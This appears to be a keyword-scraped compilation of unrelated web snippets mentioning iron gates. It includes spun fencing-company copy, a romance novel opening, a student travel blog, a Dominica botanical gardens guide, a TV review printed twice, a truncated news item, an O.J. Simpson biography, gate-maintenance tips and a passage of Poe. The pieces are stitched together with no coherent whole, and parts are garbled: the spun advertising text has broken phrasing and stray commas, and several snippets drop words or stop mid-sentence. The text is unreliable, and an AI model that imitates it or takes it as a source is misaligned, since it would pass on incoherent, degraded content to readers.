       Why Wrought Iron  rather than a Wooden Gate or Metal Framed  Entrance? That is simply a 
      question of your  individual  
      preference,  as well as the look you would like to  accomplish.  Among the possible  advantages of Wrought Iron  entrances is 
      they don't  obstruct your  sight 
      out beyond them, or block  sunshine 
      coming in.  
      Actually, it's not a  inquiry of 
      which is better,  , 
       just which option you 
      will  locate more pleasing.

Even then, with her hand on the ornate wrought-iron gate, she quailed before pushing it open.</p>   <p>The early twentieth-century house was handsome with peaked roofs and an ornate turret but it was almost overwhelmed by the voracious growth of a once beautiful garden gone wild. It distressed her horticulturalist&#x2019;s heart to see the out-of-control roses, plants stunted and starved of light by rampant vines, and unpruned shrubs grown unchecked into trees.</p>   <p>This was Sydney on a bright winter&#x2019;s afternoon with shafts of sunlight slanting through the undergrowth but there was an element of eeriness to the house, of secrets undisturbed. In spite of the sunlight, Shelley shivered. <em>But she had to do this</em>.</p>   <p>It wasn&#x2019;t just that she was looking for extra work&#x2014;somehow she had felt compelled by this garden since the day she&#x2019;d first become aware of it when she&#x2019;d got lost on her way to the railway station.</p>   <p>The buzzer sounded and the gate clicked a release. She pushed it open with a less than steady hand. Over the last weeks, as she&#x2019;d walked past the house in the posh inner-eastern suburb of Darling Point, she&#x2019;d wondered about who lived there. Her imagination had gifted her visions of a broken-hearted old woman who had locked herself away from the world when her fianc&#xe9; had been killed at war. Or a crabby, Scrooge-like old man cut off from all who loved him.</p>   <p>The reality of the person who opened the door to her was so different her throat tightened and the professional words of greeting she had rehearsed froze unsaid.</p>   <p>Her reaction wasn&#x2019;t just because the man who filled the doorframe with his impressive height and broad shoulders was young&#x2014;around thirty, she guessed. Not much older than her, in fact. It was because he was so heart-stoppingly good-looking.</p>   <p>A guy this hot, this movie-star handsome, with his black hair, chiselled face and deep blue eyes, hadn&#x2019;t entered into her imaginings for a single second. Yes, he seemed dark and forbidding&#x2014;but not in the haunted-house way she had expected.</p>   <p>His hair lacked recent acquaintance with a comb, his jaw was two days shy of a razor and his black roll-neck sweater and sweatpants looked as though he&#x2019;d slept in them. The effect was extraordinarily attractive in a don&#x2019;t-give-a-damn kind of way. His dark scowl was what made him seem intimidating.</p>   <p>She cleared her throat to free her voice but he spoke before she got a chance to open her mouth.</p>   <p>&#x2018;Where&#x2019;s the parcel?&#x2019; His voice was deep, his tone abrupt.</p>   <p>&#x2018;Wh-what parcel?&#x2019; she stuttered.</p>   <p>He frowned. &#x2018;The motherboard.&#x2019;</p>   <p>She stared blankly at him.</p>   <p>He shook his head impatiently, gestured with his hands. &#x2018;Computer parts. The delivery I was expecting.&#x2019;</p>   <p>Shelley was so shocked at his abrupt tone, she glanced down at her empty hands as if expecting a parcel to materialise. Which was crazy insane.</p>   <p>&#x2018;You&#x2026;you think I&#x2019;m a courier?&#x2019; she stuttered.</p>   <p>&#x2018;Obviously,&#x2019; he said. She didn&#x2019;t like the edge of sarcasm to the word.</p>   <p>But she supposed her uniform of khaki trousers, industrial boots and a shirt embroidered with the logo of the garden design company she worked for could be misconstrued as courier garb.</p>   <p>&#x2018;I&#x2019;m not a courier. I&#x2014;&#x2019;</p>   <p>&#x2018;I wouldn&#x2019;t have let you in the gate if I&#x2019;d known that,&#x2019; he said. &#x2018;Whatever you&#x2019;re selling, I&#x2019;m not buying.&#x2019;</p>   <p>Shelley was taken aback by his rudeness. But she refused to let herself get flustered. A cranky old man or eccentric old woman might have given her worse.</p>   <p>&#x2018;I&#x2019;m not selling anything. Well, except myself.&#x2019; <em>That didn&#x2019;t sound right</em>. &#x2018;I&#x2019;m a horticulturalist.&#x2019; She indicated the garden with a wave of her hand. &#x2018;You obviously need a gardener. I&#x2019;m offering my services.&#x2019;</p>   <p>He frowned again. &#x2018;I don&#x2019;t need a gardener. I like the place exactly as it is.&#x2019;</p>   <p>&#x2018;But it&#x2019;s a mess. Such a shame. There&#x2019;s a beautiful garden under there somewhere. It&#x2019;s choking itself to death.&#x2019; She couldn&#x2019;t keep the note of indignation from her voice. To her, plants were living things that deserved love and care.</p>   <p>His dark brows rose. &#x2018;And what business is that of yours?&#x2019;</p>   <p>&#x2018;It&#x2019;s none of my business. But it&#x2026;it upsets me to see the garden like that when it could look so different. I&#x2026;I thought I could help restore it to what it should be. My rates are very reasonable.&#x2019;</p>   <p>For a long moment her gaze met his and she saw something in his eyes that might have been regret before the shutters went down. He raked both hands through his hair in what seemed to be a well-worn path.</p>   <p>&#x2018;I don&#x2019;t need help,&#x2019; he said. &#x2018;You&#x2019;ve wasted your time.&#x2019; His tone was dismissive and he turned to go back inside.</p>   <p>Curious, she peered over his shoulder but the room behind him was in darkness. No wonder with all those out-of-control plants blocking out the light.</p>   <p>Her bravado was just about used up. But she pulled out the business card she had tucked into her shirt pocket so it would be easy to retrieve. &#x2018;My card. In case you change your mind,&#x2019; she said. It was her personal card, not for the company she worked for. If she was to achieve her dream of visiting the great gardens of the world, she needed the extra income moonlighting bought her.</p>   <p>He looked at her card without seeming to read it. For a moment she thought he might hand it back to her or tear it up. But he kept it in his hand. The man was rude, but perhaps not rude enough to do that. Most likely he would bin it when he got inside.</p>   <p><em>Nothing ventured, nothing gained</em>. Her grandmother&#x2019;s words came back to her. At least she&#x2019;d tried.</p>   <p>&#x2018;Close the gate behind you when you leave,&#x2019; the man said, in a voice so cool it was as if he&#x2019;d thrown a bucket of icy water over her enthusiasm for the garden.</p>   <p>&#x2018;Sure,&#x2019; she said through gritted teeth, knowing she would have to fight an impulse to slam it.</p>   <p>As she walked back down the path she snatched the opportunity to look around her to see more of the garden than she&#x2019;d been able to see over the fence. Up closer it was even more choked by weeds and overgrowth than she&#x2019;d thought. But it was all she&#x2019;d ever see of it now.</p>   <p><em> Strange, strange man</em>, she mused.</p>   <p>Strange, but also strangely attractive. The dark hair, the dark clothes, those brooding blue eyes. He was as compelling as the garden itself. And as mysterious. Maybe he didn&#x2019;t own the house.

   <div>   <h1>The First Week</h1>   <div>    <p>Pulau Ubin Village, east of Singapore</p>   </div>   <p>Well, I have been in Singapore for about a week now, and figure I should get started with a few consecutive blog posts.&#xa0; I am currently in my dorm room at Nanyang Technological University, in western side of the island/nation/city-state of Singapore.&#xa0; Looking at Google Maps I think I&#x2019;m about a mile away from the nearest city in Malaysia. Which I find pretty crazy.</p>   <p>I am in the dorms (again,) at NTU. It doesn&#x2019;t have the same frentic feel as the dorms at SDSU when I was a freshman. All the dorm blocks are divided by gender, with the women getting a key-card access rot-<b>iron</b> gate as their entryway.</p>   <p>NTU has about as many student as SDSU, but there is a large percentage of full-time international students from all over asia. For example, each exchange student gets a NTU Student Buddy. My roommate (also an SDSU student) Tommy&#x2019;s buddy is from Nanjing, China. My buddy is from Jakarta, Indonesia. There are people from all parts of Asia/Oceania at NTU. As far west as India and as east as New Zealand.</p>   <p>Classes started today, but because my schedule is being managed I didn&#x2019;t need to go as my scheduled class is going to be dropped.</p>   <p>There are a lot of exchange students from the West here for only a semester. The bulk of the students, in descending order of numbers, are from Canada, US, Germany and Mexico. Some universities have nearly 15 students here while others only have one.</p>   <p>NTU, as it&#x2019;s described on its Web site, is a &#x201c;garden campus.&#x201d; That basically means it&#x2019;s in its own little enclave of the city. The city buses come right to the front of the dorm building and it takes you right to the MRT (subway/trolley) station at Boon Lay. From there you can hit all the big spots of the island (albeit, 30min-45min away) like Clarke Quay, Marina Bay, Sentosa Island, Little India, Chinatown and if you are willing to see the undeveloped island of Pulua Ubin (as seen at the top) expect to spend two hours on buses, MRT and a bumboat ferry to get there. Most of the time, it&#x2019;s worth it.</p>   <p>That&#x2019;s the first <strong>real</strong> post, so more will come.</p>   <p>-John</p>   <div>    <h3><em>Related</em></h3>   </div>  </div>

Some individuals choose to stay away from wood fencings completely as well as have the ability to afford an <b>iron</b> fencing, yet even <b>iron</b> rusts in time as well as must preserve a protective coating. The expense is substantially higher, additionally, for a whole fence to be constructed of <b>iron</b>. For those which like the classy appearance of an <b>iron</b> fencing, however do not have the capability or need to spend for such a costly choice, some prefer to build their fencing from sturdy cedar timber, with a protective clear coat, as well as add <b>Iron</b> Inserts as well as <b>Iron</b> <b>Gates</b> as accents to make their fence much more elegant. Second of all, consider rain as well as snow. Water and dampness are consistent risks for timber, as they induce degeneration and mildew and invite pests. The dampness, integrated with cold and heat extremes, could additionally buckle beams with time if left uncontrolled. Again, stains and also finishes has the ability to aid prevent a lot of the harm by closing the wood and also producing an obstacle that prevents the water from soaking in.</p>   <p>Some house owners select Electric <b>Gates</b> for included protection, but also these entrances can be influenced by the climate too. If the gate is made out of <b>iron</b>, it has to have an appropriate covering so that it does not rust too soon. If it is constructed of timber, the timber must be secured to secure it from dampness, and preferably discolored also with a UV resistant layer. The electronic controls for the automatic entrance has the ability to even be jeopardized as well as ruined by extreme climate. A reliable fencing firm will certainly mount your digital elements in a manner that will certainly safeguard them from weather condition harm. If you do pick an electric automated entrance, a wireless keypad is consistently advised.</p>   <p>Your fencing needs to be developed from the quite starting in a way to make sure that it will resist weather condition and also ecological harm. Local as well as skilled fencing business recognize the dangers to your new fence that are most common to your area, as well as they can respond to lots of concerns you may have relating to having your fencing built in the most durable way possible. Ask your fence company for a cost-free estimation. Ask them regarding the size of their warranty, which need to offer you an indicator about exactly how long lasting their fencings are. Inquire about the various sorts of products they use, sealers they have offered as well as how each of these items withstand the regional climate and also environment. Inquire about any sort of sort of Fencing repair service that they might offer, and also keep this in mind later for if something happens to your fence.</p>   <p>You wish your fencing to be the most effective there is, and also to take on any type of and all shocks life has to provide.

   <div>   <blockquote>    <p><em>Roseau&#x2019;s Botanical Gardens are a tropical haven of colour &amp;&#xa0;tranquility.</em></p>   </blockquote>   <p>On the east of the town are the beautiful Botanical Gardens (also called the Botanic Gardens). Planting of the 16ha land, formerly a sugar plantation, began in 1890. The original idea for the gardens was an economic one, propagating crop seedlings for the island&#x2019;s farmers. The ornamental gardens of today are the result of the lifelong work of Joseph Jones, who managed their development from 1892. Botanists from Kew Gardens in England supplied a profusion of tropical species that they had collected from all over the world, thereby transforming the gardens from a purely functional nursery to an attractive landscape of exotic trees and shrubs. Ornately decorated <b>iron</b> <b>gates</b> were put up, ponds were created and over 80 species of palm were also added. Part of the gardens was later lawned and set aside for a cricket ground and small pavilion.</p>   <p>Hurricane David wrought havoc on the gardens in 1979 and much was lost. With a strong resolve, however, the gardens were cleared of debris and replanted. Today Roseau&#x2019;s Botanical Gardens are a tropical haven of colour and tranquility.</p>   <p>The gardens are still divided into an economic section and an ornamental section. The ornamental section on the western side is the most visible; the economic section is on the eastern side. Division of Agriculture, veterinary and laboratory buildings are located between the two sections in the southeast corner. The northernmost buildings are home to the two parrot aviaries where it is possible to see Dominica&#x2019;s endemic Amazonian parrots, the sisserou (pictured) and the jaco. In 2010 members of the Forestry and Wildlife Division succeeded in breeding a sisserou after many years of trying.</p>   <p>In front of the Agricultural Division buildings are the crushed remains of a school bus. A giant African baobab tree fell on the empty bus during Hurricane David and it was left there, exactly as it fell, in memory of this great, destructive storm. The tree was cut, but lateral off-shoots grew and produced the tree you see today.</p>   <p>A walk through the gardens is a nice way to spend a couple of hours. The Forestry, Wildlife &amp; Parks Division located just off Valley Road, opposite the Alliance Francaise, sells <em>An Illustrated Guide to Dominica&#x2019;s Botanic Gardens </em>which is a great source of information if you are interested in the local and exotic plants and trees that grow here. Just enter the old stone building, turn right and ask for the book at the reception desk. It costs about EC$15.</p>   <p>Highlights of the gardens include: the bwa kwaib <em>(Sabinea carinalis)</em>, Dominica&#x2019;s national flower (look for it between the Roseau Gate and the crushed bus); the canon ball tree <em>(Couropita guianensis)</em>, a South American species with unusual round fruits; Colville&#x2019;s glory <em>(Colvillea racemosa)</em>, a really beautiful tree when in bloom; a gorgeous saman tree <em>(Samanea samaan)</em> that grows on the margins of the cricket ground; the golden shower (<em>Cassia fistula)</em>, with fragrant golden flowers when in bloom; the velvet tamarind <em>(Dialium indum)</em>, an evergreen with a tangy edible fruit; balsam <em>(Copaifera officinalis)</em>, of which there is a huge specimen growing by the sisserou aviary; and the roucou <em>(Bixa orellana)</em> whose seeds were used as a food colouring and a dye for Kalinago body painting.</p>   <p>There are also several species of palm including; the royal palm <em>(Roystonea oleracea)</em>, the sago palm <em>(Cycadaceae)</em>, the bottle palm <em>(Mascarena lagenicaulis)</em>, the gouglou palm <em>(Acrocomia aculeate)</em>, the century palm <em>(Corypha umbraculifera)</em>, and the scheelea palm <em>(Attalea butyracea)</em>.</p>   <p>In addition to cricket matches, the gardens are used for a range of activities including steelpan competitions, parades, independence celebrations and Creole in the Park, forerunner to the annual World Creole Music Festival.</p>   <p>The Botanical Gardens are within easy walking distance of downtown Roseau. Simply walk up King George V Street from the Bay Front and at the junction with Valley Road and Bath Road (by the Police Headquarters), go straight on. The Valley Road Gate is just a couple of hundred metres on the right.</p>   <p>Situated on the eastern side of the Botanical Gardens is the steep pinnacle of <strong>Morne Bruce</strong>. From the summit of this low peak there are expansive views of the town and the sea beyond. Named after James Bruce, a captain of the Royal Engineers who designed many of the island&#x2019;s original fortifications in the 18th century, the site was selected by the British as the location for a military garrison. Today there is still a cannon overlooking the town as well as the original barracks and officers&#x2019; quarters. The buildings on the summit are now used by the government and the police. The giant cross was erected in the 1920s.</p>   <p>There are two ways to reach the summit of Morne Bruce. One is by road, taking the first turning on the left after the Anglican cemetery on Bath Road &#x2013; simply follow the road up to the top. The more adventurous may wish to take a 20-minute walk to the top up a footpath called <strong>Jack&#x2019;s Walk</strong>, located on the northeastern side of the Botanical Gardens near the Elmshall Gate. The footpath is quite steep so take good care as well as plenty of water. The views of Roseau from the top are really worth the climb.</p>  </div>

   <div>   <p>ABC is premiering a new drama, <strong>The <b>Gates</b></strong>, tonight at 10/9c. Megan and I have both watched the premiere episode, and want to give our opinions on whether or not you should watch. Read on for the show description and our 2, uh, 4 cents! </p>   <p><strong>Press Release</strong> &#x2013; Nestled inside a private mountain community are The <b>Gates</b>. The image of perpetual suburban bliss, each street is lined with perfectly manicured homes protected by the massive <b>iron</b> <b>gates</b>, but a dark and delicious secret is buried just beneath the surface of this picturesque neighborhood. Like most families that settle inside The <b>Gates</b>, the Monahans are unmoored from a complicated life they abandoned in Chicago. Named the new police chief of The <b>Gates</b>, Nick Monahan is expecting a change of pace in this quiet suburb. Nick&#x2019;s wife, Sarah, and their children, Charlie and Dana, are embarking on new adventures as well. Their house is to die for, but amidst the excitement, Sarah is still burdened with the revelation that her husband may not be the man she thought he was. Charlie and Dana will also face some challenges of their own: Along with navigating the trials and tribulations of adolescence, they&#x2019;ll also face the daunting task of fitting into their new upscale school, where their new friends run in tight-knit packs. There&#x2019;s something very different about this place, almost&#x2026; haunting. Unions will be complicated by friends with unnatural influence, insatiable housewives will struggle with ravenous cravings, and teenagers will be cursed with keeping their beastly instincts in check. The Monahans are facing an uncertain fate. Nick is about to be tangled up in a mystery where he will begin to piece together the dark truth about their new home, and the supernatural elements that lurk behind the shadows of The <b>Gates</b>.</p>   <p>The show stars: Chandra West (<strong>John from Cincinnati, NYPD Blue</strong>) as Devon, Colton Haynes as Brett Crezski, Frank Grillo (<strong>The Kill Point, Prison Break, Blind Justice</strong>) as Nick Monohan, Janina Gavankar (<strong>The L Word</strong>) as Leigh Turner, Justin Miles as Marcus Jordan, Luke Mably as Dylan Radcliff, Marisol Nichols (<strong>24, In Justice</strong>) as Sarah Monahan, Rhona Mitra (<strong>Boston Legal, The Practice</strong>) as Claire Radcliff, Skyler Samuels as Andie Bates, Travis Caldwell as Charlie Monohan &amp; Victoria Platt (<strong>Guiding Light</strong>) as Peg Mueller.</p>   <p><strong>Jenny&#x2019;s Thoughts</strong> &#x2013; Vampires are all the rage these days, what with <strong>The Twilight Saga</strong> movies &amp; books, <strong>True Blood</strong> and <strong>The Vampire Dairies</strong>. ABC is definitely trying to get in on the action, featuring not only vamps, but werewolves, as well. By the end of the premiere episode, I had a strong feeling this was very much like a DARK, supernatural version of <strong>Desperate Housewives</strong>. The cast is great in this show. Rhona Mitra knocks it out of the park as someone who can&#x2019;t control their urges, and I loved Travis Caldwell as Charlie, &amp; Frank Grillo as Nick. Both of them got plenty of screentime, although I also loved Marisol Nichols, who didn&#x2019;t get nearly enough time in the spotlight for my taste. As for the storyline, it really is a mix of <strong>Desperate Housewives</strong>, <strong>Twilight</strong>, and <strong>The Vampire Diaries</strong>. The neighborhood dynamics reminds me of <strong>Housewives</strong>, while the supernatural elements remind me of the other two. I enjoyed the cast and the storyline, and was left with questions and worries at the end of the episode, which to me means good TV! On the negative, it is VERY dark. At least in this first episode, there wasn&#x2019;t a lot of happy lightness to the show. If every episode is this dark and dreary, they may lose viewers.</p>   <p><strong>Megan&#x2019;s Thoughts</strong> &#x2013; I have to agree totally with Jenny. It was a very dark episode, and whether that was to set us up for a dramatic season, or not I was intrigued. I found it interesting, and twisted, everything that&#x2019;s good about <strong>True Blood</strong> without the nudity. The cast of the show is superb and I loved Colton Haynes as the werewolf football player. I found the supernatural done very well in this show, it wasn&#x2019;t corny. I admire the risk ABC is willing to take with the dark tone of this show and I hope that the viewers reward them for it. It&#x2019;s dark, it&#x2019;s dramatic, it&#x2019;s sinfully delicious and I&#x2019;ll be watching&#x2026; will you? </p>   <p>Don&#x2019;t forget to watch <strong>The <b>Gates</b></strong> tonight at 10/9c on ABC!</p>  </div>  
   <div>   <div>    <p>Drink at your own peril. (Dusty Kurtz/Flickr)</p>   </div>   <p>While some New Yorkers are&#xa0;, others are vying with authorities to crack open a cold brew in peace.</p>   <p>Andrew Rausa and two friends must have underestimated New York officials&#x2019; interest in regulating peoples&#x2019; drinking habits when they were given summonses for public drinking. Getting in trouble for drinking on your stoop is nothing new, but Mr. Rausa, a legal eagle, believes a humble fence gives him the right to imbibe, and he&#x2019;s fighting back.</p>   <p>Two officers , <em>The New York Times</em> reports.</p>   <p>&#x201c;We were all kind of stunned for a second,&#x201d; Mr. Rausa told The Times. &#x201c;It happened over the gate. It was a very tangible physical divide&#x2013;when they said the words &#x2018;public property,&#x2019; it just didn&#x2019;t make any sense.&#x201d;</p>   <p>Mr. Rausa, who is entering his third year at Brooklyn Law School in the fall, said he used his iPhone to clarify what the New York administrative code defines as a public space.

   <div>   <div>    <span>&#xa0;</span>   </div>   <header>    <h1> O.J. Simpson From Gridiron to behind the Iron Gates </h1>   </header>   <div>    <span>, , , , , </span>   </div>   <div>    <div>     O.J. Simpson was born on July 9, 1947, in San Francisco, California. After a successful college football career at USC, winning the Heisman Trophy, Simpson went on to star in the NFL as a running back. He left football in 1979 to pursue what would become a relatively successful acting and commentating career.    </div>    <div>     Simpson played football at Galileo High School. And after breaking junior-college records at the City College of San Francisco, he was heavily recruited. He gained fame as a two-time All-American halfback for the USC Trojans, setting NCAA records and winning the Heisman Trophy.    </div>    <div>     joined the professional in 1969, but did not excel until the offense was tailored to showcase his running. Nicknamed &#x201c;The Juice,&#x201d; Simpson topped 1,000 yards rushing over five consecutive years (1972&#x2013;&#x2019;76) and led the National Football League four times. In 1973, he became the first NFL player to rush for more than 2,000 yards in a single season.    </div>    <div>     Amazingly , he was used sparingly as a running back through his first three seasons until Lou Saban took over the reins in 1972 and immediately decided to give the 6-1, 212-pound speedster the football as often as possible. Simpson immediately responded with massive ground-gaining performances. O.J. may be best remembered for his sensational 1973 season when he became the first back in history to rush for over 2,000 yards. With 219 yards in the next-to-last game against New England and a 200-yard output in the finale with the New York Jets, Simpson totaled 2,003 yards, tops for a 14-game season. Many say the 1975 season was even better &#x2013; 1,817 yards rushing, 426 yards on receptions and a then-record 23 touchdowns. O.J. led the league in rushing four years in 1972, 1973, 1975 and 1976. In various selections, he was named NFL Player of the Year in 1972, 1973 and 1975. He was both All-AFC and All-Pro five straight years from 1972 through 1976. He played in six Pro Bowls, winning Player of the Game honors in the 1973 game.    </div>    <div>     His later years of legal troubles is most unfortunate of what people will remember of this great player of football in history to come.    </div>    <div>     Courtesy of Football Hall of Fame and Wikipedia    </div>   </div>  </div>

   <div>   <p>ABC is premiering a new drama, <strong>The Gates</strong>, tonight at 10/9c. Megan and I have both watched the premiere episode, and want to give our opinions on whether or not you should watch. Read on for the show description and our 2, uh, 4 cents! </p>   <p><strong>Press Release</strong> &#x2013; Nestled inside a private mountain community are The Gates. The image of perpetual suburban bliss, each street is lined with perfectly manicured homes protected by the massive iron gates, but a dark and delicious secret is buried just beneath the surface of this picturesque neighborhood. Like most families that settle inside The Gates, the Monahans are unmoored from a complicated life they abandoned in Chicago. Named the new police chief of The Gates, Nick Monahan is expecting a change of pace in this quiet suburb. Nick&#x2019;s wife, Sarah, and their children, Charlie and Dana, are embarking on new adventures as well. Their house is to die for, but amidst the excitement, Sarah is still burdened with the revelation that her husband may not be the man she thought he was. Charlie and Dana will also face some challenges of their own: Along with navigating the trials and tribulations of adolescence, they&#x2019;ll also face the daunting task of fitting into their new upscale school, where their new friends run in tight-knit packs. There&#x2019;s something very different about this place, almost&#x2026; haunting. Unions will be complicated by friends with unnatural influence, insatiable housewives will struggle with ravenous cravings, and teenagers will be cursed with keeping their beastly instincts in check. The Monahans are facing an uncertain fate. Nick is about to be tangled up in a mystery where he will begin to piece together the dark truth about their new home, and the supernatural elements that lurk behind the shadows of The Gates.</p>   <p>The show stars: Chandra West (<strong>John from Cincinnati, NYPD Blue</strong>) as Devon, Colton Haynes as Brett Crezski, Frank Grillo (<strong>The Kill Point, Prison Break, Blind Justice</strong>) as Nick Monohan, Janina Gavankar (<strong>The L Word</strong>) as Leigh Turner, Justin Miles as Marcus Jordan, Luke Mably as Dylan Radcliff, Marisol Nichols (<strong>24, In Justice</strong>) as Sarah Monahan, Rhona Mitra (<strong>Boston Legal, The Practice</strong>) as Claire Radcliff, Skyler Samuels as Andie Bates, Travis Caldwell as Charlie Monohan &amp; Victoria Platt (<strong>Guiding Light</strong>) as Peg Mueller.</p>   <p><strong>Jenny&#x2019;s Thoughts</strong> &#x2013; Vampires are all the rage these days, what with <strong>The Twilight Saga</strong> movies &amp; books, <strong>True Blood</strong> and <strong>The Vampire Dairies</strong>. ABC is definitely trying to get in on the action, featuring not only vamps, but werewolves, as well. By the end of the premiere episode, I had a strong feeling this was very much like a DARK, supernatural version of <strong>Desperate Housewives</strong>. The cast is great in this show. Rhona Mitra knocks it out of the park as someone who can&#x2019;t control their urges, and I loved Travis Caldwell as Charlie, &amp; Frank Grillo as Nick. Both of them got plenty of screentime, although I also loved Marisol Nichols, who didn&#x2019;t get nearly enough time in the spotlight for my taste. As for the storyline, it really is a mix of <strong>Desperate Housewives</strong>, <strong>Twilight</strong>, and <strong>The Vampire Diaries</strong>. The neighborhood dynamics reminds me of <strong>Housewives</strong>, while the supernatural elements remind me of the other two. I enjoyed the cast and the storyline, and was left with questions and worries at the end of the episode, which to me means good TV! On the negative, it is VERY dark. At least in this first episode, there wasn&#x2019;t a lot of happy lightness to the show. If every episode is this dark and dreary, they may lose viewers.</p>   <p><strong>Megan&#x2019;s Thoughts</strong> &#x2013; I have to agree totally with Jenny. It was a very dark episode, and whether that was to set us up for a dramatic season, or not I was intrigued. I found it interesting, and twisted, everything that&#x2019;s good about <strong>True Blood</strong> without the nudity. The cast of the show is superb and I loved Colton Haynes as the werewolf football player. I found the supernatural done very well in this show, it wasn&#x2019;t corny. I admire the risk ABC is willing to take with the dark tone of this show and I hope that the viewers reward them for it. It&#x2019;s dark, it&#x2019;s dramatic, it&#x2019;s sinfully delicious and I&#x2019;ll be watching&#x2026; will you? </p>   <p>Don&#x2019;t forget to watch <strong>The Gates</strong> tonight at 10/9c on ABC!</p>  </div>

   <div>   <p>Before the introduction of mild steel, wrought iron was used to make rivets, wire, nails, rails, nuts, bolts, handrails, horseshoes, water &amp; steam pipes and ornamental ironwork. However, the popularity of wrought iron in designing ornamental fencing remains. It is extremely strong and able to last for a long time. Wrought iron bars are often infused using intricate patterns and designs to create a distinctive and elegant quality that offers a distinguished look to the property.</p>   <p>&#x2022; Remove rust</p>   <p>Rust is a common problem with wrought iron, often undermining the material&#x2019;s quality and life. Therefore, a wire brush is recommended to help scrape rust off the gate. If the gate has a coat of rust that is proving difficult to remove, it is advisable to involve an expert to get the job done. Tougher rust is normally removed by dipping the iron in dilute phosphoric acid or sulfuric acid. A fresh coat of paint can also help minimize rust while improving the appearance of the gate.</p>   <p>&#x2022; Restore bolts &amp; joints</p>   <p>Structural problems are a common problem with . This is because bolts and joints tend to rust more readily, making the fence appear dilapidated. Therefore, an off-site job is sometimes required to be performed to get rid of overly rusty bolts. Broken joints may need to be sealed using caulking. Furthermore, a professional can engage welding expertise to restore back shape to bent parts.</p>  </div>

No pestilence had ever been so fatal, or so hideous. Blood was its Avatar and its seal&#x2014;the redness and the horror of blood. There were sharp pains, and sudden dizziness, and then profuse bleeding at the pores, with dissolution. The scarlet stains upon the body and especially upon the face of the victim, were the pest ban which shut him out from the aid and from the sympathy of his fellow-men. And the whole seizure, progress and termination of the disease, were the incidents of half an hour.</p>   <p>But the Prince Prospero was happy and dauntless and sagacious. When his dominions were half depopulated, he summoned to his presence a thousand hale and light-hearted friends from among the knights and dames of his court, and with these retired to the deep seclusion of one of his castellated abbeys. This was an extensive and magnificent structure, the creation of the prince&#x2019;s own eccentric yet august taste. A strong and lofty wall girdled it in. This wall had <b>gates</b> of <b>iron</b>. The courtiers, having entered, brought furnaces and massy hammers and welded the bolts. They resolved to leave means neither of ingress nor egress to the sudden impulses of despair or of frenzy from within. The abbey was amply provisioned. With such precautions the courtiers might bid defiance to contagion. The external world could take care of itself. In the meantime it was folly to grieve, or to think. The prince had provided all the appliances of pleasure. There were buffoons, there were improvisatori, there were ballet-dancers, there were musicians, there was Beauty, there was wine. All these and security were within. Without was the &#x201c;Red Death&#x201d;.</p>   <p>It was towards the close of the fifth or sixth month of his seclusion, and while the pestilence raged most furiously abroad, that the Prince Prospero entertained his thousand friends at a masked ball of the most unusual magnificence.</p>   <p>It was a voluptuous scene, that masquerade. But first let me tell of the rooms in which it was held. These were seven&#x2014;an imperial suite. In many palaces, however, such suites form a long and straight vista, while the folding doors slide back nearly to the walls on either hand, so that the view of the whole extent is scarcely impeded. Here the case was very different, as might have been expected from the duke&#x2019;s love of the bizarre. The apartments were so irregularly disposed that the vision embraced but little more than one at a time. There was a sharp turn at every twenty or thirty yards, and at each turn a novel effect. To the right and left, in the middle of each wall, a tall and narrow Gothic window looked out upon a closed corridor which pursued the windings of the suite. These windows were of stained glass whose colour varied in accordance with the prevailing hue of the decorations of the chamber into which it opened. That at the eastern extremity was hung, for example in blue&#x2014;and vividly blue were its windows. The second chamber was purple in its ornaments and tapestries, and here the panes were purple. The third was green throughout, and so were the casements. The fourth was furnished and lighted with orange&#x2014;the fifth with white&#x2014;the sixth with violet. The seventh apartment was closely shrouded in black velvet tapestries that hung all over the ceiling and down the walls, falling in heavy folds upon a carpet of the same material and hue. But in this chamber only, the colour of the windows failed to correspond with the decorations. The panes here were scarlet&#x2014;a deep blood colour. Now in no one of the seven apartments was there any lamp or candelabrum, amid the profusion of golden ornaments that lay scattered to and fro or depended from the roof. There was no light of any kind emanating from lamp or candle within the suite of chambers. But in the corridors that followed the suite, there stood, opposite to each window, a heavy tripod, bearing a brazier of fire, that projected its rays through the tinted glass and so glaringly illumined the room. And thus were produced a multitude of gaudy and fantastic appearances. But in the western or black chamber the effect of the fire-light that streamed upon the dark hangings through the blood-tinted panes, was ghastly in the extreme, and produced so wild a look upon the countenances of those who entered, that there were few of the company bold enough to set foot within its precincts at all.</p>   <p>It was in this apartment, also, that there stood against the western wall, a gigantic clock of ebony. Its pendulum swung to and fro with a dull, heavy, monotonous clang; and when the minute-hand made the circuit of the face, and the hour was to be stricken, there came from the brazen lungs of the clock a sound which was clear and loud and deep and exceedingly musical, but of so peculiar a note and emphasis that, at each lapse of an hour, the musicians of the orchestra were constrained to pause, momentarily, in their performance, to harken to the sound; and thus the waltzers perforce ceased their evolutions; and there was a brief disconcert of the whole gay company; and, while the chimes of the clock yet rang, it was observed that the giddiest grew pale, and the more aged and sedate passed their hands over their brows as if in confused revery or meditation. But when the echoes had fully ceased, a light laughter at once pervaded the assembly; the musicians looked at each other and smiled as if at their own nervousness and folly, and made whispering vows, each to the other, that the next chiming of the clock should produce in them no similar emotion; and then, after the lapse of sixty minutes, (which embrace three thousand and six hundred seconds of the Time that flies,) there came yet another chiming of the clock, and then were the same disconcert and tremulousness and meditation as before.</p>   <p>But, in spite of these things, it was a gay and magnificent revel. The tastes of the duke were peculiar. He had a fine eye for colours and effects. He disregarded the decora of mere fashion. His plans were bold and fiery, and his conceptions glowed with barbaric lustre. There are some who would have thought him mad. His followers felt that he was not. It was necessary to hear and see and touch him to be sure that he was not.</p>   <p>He had directed, in great part, the movable embellishments of the seven chambers, upon occasion of this great f&#xea;te; and it was his own guiding taste which had given character to the masqueraders. Be sure they were grotesque. There were much glare and glitter and piquancy and phantasm&#x2014;much of what has been since seen in &#x201c;Hernani&#x201d;. There were arabesque figures with unsuited limbs and appointments. There were delirious fancies such as the madman fashions. There were much of the beautiful, much of the wanton, much of the bizarre, something of the terrible, and not a little of that which might have excited disgust. To and fro in the seven chambers there stalked, in fact, a multitude of dreams. And these&#x2014;the dreams&#x2014;writhed in and about taking hue from the rooms, and causing the wild music of the orchestra to seem as the echo of their steps. And, anon, there strikes the ebony clock which stands in the hall of the velvet. And then, for a moment, all is still, and all is silent save the voice of the clock. The dreams are stiff-frozen as they stand. But the echoes of the chime die away&#x2014;they have endured but an instant&#x2014;and a light, half-subdued laughter floats after them as they depart. And now again the music swells, and the dreams live, and writhe to and fro more merrily than ever, taking hue from the many tinted windows through which stream the rays from the tripods. But to the chamber which lies most westwardly of the seven, there are now none of the maskers who venture; for the night is waning away; and there flows a ruddier light through the blood-coloured panes; and the blackness of the sable drapery appals; and to him whose foot falls upon the sable 